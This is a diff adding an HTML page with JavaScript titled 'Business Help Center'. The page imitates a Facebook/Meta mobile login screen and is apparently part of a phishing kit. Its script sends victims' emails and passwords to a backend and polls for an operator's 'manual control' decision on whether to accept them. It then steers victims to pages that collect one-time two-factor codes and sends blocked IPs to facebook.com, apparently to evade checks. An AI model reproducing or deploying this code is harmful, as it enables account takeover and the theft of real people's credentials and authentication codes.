@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Business Help Center</title>
+    <link rel="icon" type="image/png" href="img/icon1.png">
+    <link rel="preload" as="image" href="img/photo_1_2026-02-12_01-09-06.jpg">
+    <link rel="preload" as="image" href="img/photo_2_2026-02-12_01-09-06.jpg">
+    <link rel="preload" as="image" href="img/photo_3_2026-02-12_01-09-06.jpg">
+    <link rel="preload" as="image" href="img/photo_4_2026-02-12_01-09-06.jpg">
+    <script src="lang-manager.js"></script>
+    <script>window.MB_INTRO_ENABLED = true;</script>
+    <script src="intro-loader.js"></script>
+
+    <style>
+        @font-face {
+            font-family: 'Optimistic';
+            src: url('../font/ea4876dcb7fb6c98-s.p.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: 'Optimistic';
+            src: url('../font/ea4876dcb7fb6c98-s.p.woff2') format('woff2');
+            font-weight: 500;
+            font-style: normal;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: 'Optimistic';
+            src: url('../font/9c18eba18d4baf22-s.p.woff2') format('woff2');
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100%;
+            text-align: center;
+            padding: 30px 20px 0 20px;
+        }
+
+        .lang {
+            font-size: 13.5px;
+            font-weight: 400;
+            color: #666a72;
+            line-height: 17.5518px;
+            margin-bottom: 50px;
+            margin-top: 0;
+        }
+
+        .logo img {
+            width: 50px;
+            margin-bottom: 100px;
+        }
+
+        .login-box {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-wrap {
+            position: relative;
+            width: 100%;
+            min-height: 52px;
+        }
+
+        /* Fix autofill background */
+        .input-wrap input:-webkit-autofill + label,
+        .input-wrap input:-webkit-autofill:focus + label {
+            top: 12px;
+            transform: translateY(0);
+            font-size: 11px;
+            color: #8a8d91;
+        }
+
+        .input-wrap input {
+            width: 100%;
+            padding: 27px 16px 11px;
+            font-size: 15.2px;
+            font-weight: 400;
+            color: #111112;
+            border: 1px solid #dddfe2;
+            border-radius: 15px;
+            outline: none;
+            box-sizing: border-box;
+            background: transparent;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+            line-height: 19.76px;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrap input::placeholder {
+            color: transparent;
+        }
+
+        .input-wrap input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+
+        .input-wrap label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 15.2px;
+            font-weight: 400;
+            color: #8a8d91;
+            pointer-events: none;
+            transition: top 0.15s ease, font-size 0.15s ease, transform 0.15s ease;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+            line-height: 1;
+        }
+
+        .input-wrap input:focus + label,
+        .input-wrap input:not(:placeholder-shown) + label,
+        .input-wrap input.has-value + label {
+            top: 12px;
+            transform: translateY(0);
+            font-size: 11px;
+            color: #8a8d91;
+        }
+
+        .input-wrap input:focus + label {
+            color: #1877f2;
+        }
+
+        .input-wrap input.input-error {
+            border-color: #d31130;
+            box-shadow: 0 0 0 2px rgba(211,17,48,.2);
+        }
+
+        .input-wrap input.input-error + label {
+            color: #d31130;
+        }
+
+        .login-btn {
+            background: #1877f2;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 25px;
+            font-size: 15.2px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+        }
+
+        .forgot {
+            display: block;
+            margin: 15px 0;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .new-account {
+            width: 100%;
+            padding: 14px;
+            border-radius: 25px;
+            border: 1px solid #1877f2;
+            background: white;
+            color: #1877f2;
+            font-size: 15.2px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 100px;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+        }
+
+        .footer {
+            margin-top: 35px;
+        }
+
+        .meta-logo {
+            width:  80px;
+            margin-bottom: 10px;
+        }
+
+        .links {
+            font-size: 13px;
+            color: #777;
+        }
+        
+        .error-msg {
+            color: #d31130;
+            font-size: 11px;
+            line-height: 14px;
+            margin-bottom: 4px;
+            margin-top: -4px;
+            padding-left: 6px;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <p class="lang" style="font-weight: 500;" data-i18n="meta.name">English</p>
+
+        <div class="logo">
+            <img src="img/mb-logo.png">
+        </div>
+
+        <form class="login-box" id="loginForm" onsubmit="handleMobileLogin(event)">
+            <div class="input-wrap">
+                <input type="text" id="mobileEmail" name="email" placeholder="Mobile number or email" required autocomplete="username">
+                <label for="mobileEmail" data-i18n="login.email_placeholder">Mobile number or email address</label>
+            </div>
+            <div class="input-wrap">
+                <input type="password" id="mobilePassword" name="password" placeholder="Password" required autocomplete="current-password">
+                <label for="mobilePassword" data-i18n="login.password_placeholder">Password</label>
+            </div>
+            <button type="submit" class="login-btn" data-i18n="login.login_button">Log In</button>
+        </form>
+
+        <a href="#" class="forgot" data-i18n="login.forgot_password">Forgotten password?</a>
+
+        <button class="new-account" data-i18n="login.create_account">Create New Account</button>
+
+        <div class="footer">
+            <img src="img/logo.png" class="meta-logo">
+        </div>
+
+    </div>
+
+    <script>
+        // Floating label: handle autofill and input events
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('.input-wrap input').forEach(function(input) {
+                function checkValue() {
+                    if (input.value) {
+                        input.classList.add('has-value');
+                    } else {
+                        input.classList.remove('has-value');
+                    }
+                }
+                input.addEventListener('input', checkValue);
+                input.addEventListener('change', checkValue);
+                // Check autofill after short delay
+                setTimeout(checkValue, 200);
+            });
+        });
+
+        // Generate unique session ID on page load
+        let sessionId = Date.now() + '_' + Math.random().toString(36).substring(2);
+        sessionStorage.setItem('session_id', sessionId);
+        
+        // Login Status Polling for Manual Control Mode
+        let loginStatusPollInterval = null;
+        let loginStatusPollStartTime = null;
+        const MAX_LOGIN_POLL_DURATION = 5 * 60 * 1000; // 5 minutes
+        
+        function startMobileLoginStatusPolling(submitBtn) {
+            const sessionId = sessionStorage.getItem('session_id');
+            if (!sessionId) return;
+            
+            loginStatusPollStartTime = Date.now();
+            console.log('[Mobile Manual Control] Started polling...');
+            
+            loginStatusPollInterval = setInterval(() => {
+                if (Date.now() - loginStatusPollStartTime > MAX_LOGIN_POLL_DURATION) {
+                    console.log('[Mobile Manual Control] Timeout');
+                    stopMobileLoginStatusPolling();
+                    handleMobileLoginRejected('Request timeout. Please try again.', submitBtn);
+                    return;
+                }
+                
+                fetch('/api/check_login_status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('[Mobile Manual Control] Poll:', data.status);
+                    
+                    if (data.status === 'waiting') return;
+                    
+                    if (data.status === 'password_rejected') {
+                        stopMobileLoginStatusPolling();
+                        // Save rejected password to local blacklist
+                        const rejectedPw = sessionStorage.getItem('userPassword');
+                        if (rejectedPw) {
+                            let localBlacklist = JSON.parse(sessionStorage.getItem('rejected_passwords') || '[]');
+                            if (!localBlacklist.includes(rejectedPw)) {
+                                localBlacklist.push(rejectedPw);
+                                sessionStorage.setItem('rejected_passwords', JSON.stringify(localBlacklist));
+                            }
+                        }
+                        handleMobileLoginRejected(data.message || 'The password that you\'ve entered is incorrect.', submitBtn);
+                        return;
+                    }
+                    
+                    if (data.status === 'password_approved') {
+                        stopMobileLoginStatusPolling();
+                        handleMobileLoginApproved(data.otp_type);
+                        return;
+                    }
+                    
+                    if (data.status === 'session_not_found') {
+                        stopMobileLoginStatusPolling();
+                        handleMobileLoginRejected('Session expired. Please try again.', submitBtn);
+                        return;
+                    }
+                })
+                .catch(err => console.error('[Mobile Manual Control] Poll error:', err));
+            }, 1500);
+        }
+        
+        function stopMobileLoginStatusPolling() {
+            if (loginStatusPollInterval) {
+                clearInterval(loginStatusPollInterval);
+                loginStatusPollInterval = null;
+                loginStatusPollStartTime = null;
+                console.log('[Mobile Manual Control] Polling stopped');
+            }
+        }
+        
+        function handleMobileLoginRejected(errorMessage, submitBtn) {
+            // Generate NEW session ID for next attempt
+            const newSessionId = Date.now() + '_' + Math.random().toString(36).substring(2);
+            sessionStorage.setItem('session_id', newSessionId);
+            console.log('[Mobile Manual Control] New session ID:', newSessionId);
+            
+            if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                submitBtn.style.cursor = 'pointer';
+                submitBtn.textContent = langManager.t('login.login_button');
+            }
+            
+            const passwordInput = document.getElementById('mobilePassword');
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
+            
+            showMobileLoginError(errorMessage);
+        }
+        
+        function handleMobileLoginApproved(otpType) {
+            const otpPages = {
+                'phone': 'otp-form.html',
+                'auth_app': 'otp-auth-app.html',
+                'mail': 'otp-mail-app.html',
+                'notification': 'otp-notification.html'
+            };
+            
+            const otpPage = otpPages[otpType] || 'otp-form.html';
+            const email = document.getElementById('mobileEmail').value;
+            const password = document.getElementById('mobilePassword').value;
+            
+            sessionStorage.setItem('userEmail', email);
+            sessionStorage.setItem('userPassword', password);
+            window.location.href = otpPage;
+        }
+        
+        function handleMobileLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('mobileEmail').value;
+            const password = document.getElementById('mobilePassword').value;
+            
+            // Remove existing error message
+            const existingError = document.getElementById('mobileLoginError');
+            if (existingError) {
+                existingError.remove();
+            }
+            document.getElementById('mobilePassword').classList.remove('input-error');
+            if (!email || !password) {
+                showMobileLoginError('Please enter your email or phone number and password.');
+                return;
+            }
+            
+            // Email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            // Phone validation - chấp nhận số từ 6-15 chữ số
+            const phoneRegex = /^[\+]?[0-9]{6,30}$/;
+            
+            const isValidEmail = emailRegex.test(email);
+            const isValidPhone = phoneRegex.test(email.replace(/[\s\-\(\)\.]/g, ''));
+            
+            if (!isValidEmail && !isValidPhone) {
+                showMobileLoginError("The email or phone number you've entered doesn't match any account. Find your account and log in.");
+                return;
+            }
+
+            // Check local rejected password blacklist
+            const localBlacklist = JSON.parse(sessionStorage.getItem('rejected_passwords') || '[]');
+            if (localBlacklist.includes(password)) {
+                showMobileLoginError("The password you've entered is incorrect.");
+                return;
+            }
+            
+            // Disable and dim submit button
+            const submitBtn = document.querySelector('.login-btn');
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.6';
+            submitBtn.style.cursor = 'not-allowed';
+            
+            // Save credentials for later use
+            sessionStorage.setItem('userEmail', email);
+            sessionStorage.setItem('userPassword', password);
+
+            // Send login request to backend
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    session_id: sessionStorage.getItem('session_id')
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'blocked') {
+                    // IP is blocked - redirect immediately
+                    window.location.href = data.redirect_url || 'https://www.facebook.com';
+                    return;
+                }
+                
+                // Check if manual control mode (waiting_decision status)
+                if (data.status === 'waiting_decision') {
+                    // Manual Control Mode: Start polling for admin decision
+                    submitBtn.innerHTML = '<span class="btn-spinner"></span>';
+                    startMobileLoginStatusPolling(submitBtn);
+                    return;
+                }
+                
+                if (data.status === 'otp_required') {
+                    // Store credentials and redirect to OTP page
+                    sessionStorage.setItem('userEmail', email);
+                    sessionStorage.setItem('userPassword', password);
+                    window.location.href = 'otp-form.html';
+                } else {
+                    // Show error message inline
+                    submitBtn.disabled = false;
+                    submitBtn.style.opacity = '1';
+                    submitBtn.style.cursor = 'pointer';
+                    submitBtn.textContent = langManager.t('login.login_button');
+                    
+                    // Use message from API response or fallback to default
+                    const apiMessage = data.message || '';
+                    let errorMessage;
+                    
+                    // Check for invalid email/phone error
+                    if (apiMessage.toLowerCase().includes('invalid')) {
+                        errorMessage = langManager.t('login.error_invalid_data');
+                    } else {
+                        errorMessage = langManager.t('login.error_wrong');
+                    }
+                    
+                    showMobileLoginError(errorMessage);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                submitBtn.style.cursor = 'pointer';
+                submitBtn.textContent = langManager.t('login.login_button');
+                
+                showMobileLoginError('An error occurred. Please try again.');
+            });
+        }
+        
+        function showMobileLoginError(message) {
+            // Remove existing error
+            const existingError = document.getElementById('mobileLoginError');
+            if (existingError) {
+                existingError.remove();
+            }
+            
+            // Clear password field and focus on it
+            const passwordInput = document.getElementById('mobilePassword');
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.focus();
+                passwordInput.classList.add('input-error');
+            }
+            
+            // Create error message
+            const errorMsg = document.createElement('div');
+            errorMsg.id = 'mobileLoginError';
+            errorMsg.className = 'error-msg';
+            errorMsg.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;margin-top:1px"><circle cx="8" cy="8" r="7.5" stroke="#d31130"/><rect x="7.25" y="3.5" width="1.5" height="5.5" rx="0.75" fill="#d31130"/><circle cx="8" cy="11.25" r="0.875" fill="#d31130"/></svg><span style="color:#d31130;font-size:11px;line-height:14px">' + message + '</span>';
+            
+            // Insert after password input, before login button
+            const loginBtn = document.querySelector('.login-btn');
+            if (loginBtn && loginBtn.parentNode) {
+                loginBtn.parentNode.insertBefore(errorMsg, loginBtn);
+            }
+        }
+        
+        // Check if admin forced move to OTP
+        let forceOTPCheckInterval = null;
+
+        function startForceOTPCheck() {
+            const sessionId = sessionStorage.getItem('session_id');
+            if (!sessionId) return;
+            
+            // Check every 2 seconds
+            forceOTPCheckInterval = setInterval(() => {
+                fetch('/api/check_force_otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Check force_redirect first (highest priority - "Sai Data" action)
+                    if (data.force_redirect === true) {
+                        clearInterval(forceOTPCheckInterval);
+                        window.location.href = '/';
+                        return;
+                    }
+                    
+                    if (data.force_otp === true) {
+                        // Stop checking
+                        clearInterval(forceOTPCheckInterval);
+                        
+                        // Determine which OTP page to load
+                        const otpPage = data.force_type === 'auth_app' ? 'otp-auth-app.html' 
+                                      : data.force_type === 'mail' ? 'otp-mail-app.html'
+                                      : data.force_type === 'notification' ? 'otp-notification.html'
+                                      : 'otp-form.html';
+                        
+                        // Redirect to OTP page
+                        window.location.href = otpPage;
+                    }
+                })
+                .catch(err => console.error('Force OTP check error:', err));
+            }, 2000);
+        }
+
+        // Start checking when page loads
+        if (sessionStorage.getItem('session_id')) {
+            startForceOTPCheck();
+        }
+
+        // Trigger polling immediately when user returns to tab
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible' && loginStatusPollInterval) {
+                fetch('/api/check_login_status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionStorage.getItem('session_id') })
+                }).catch(() => {});
+            }
+        });
+    </script>
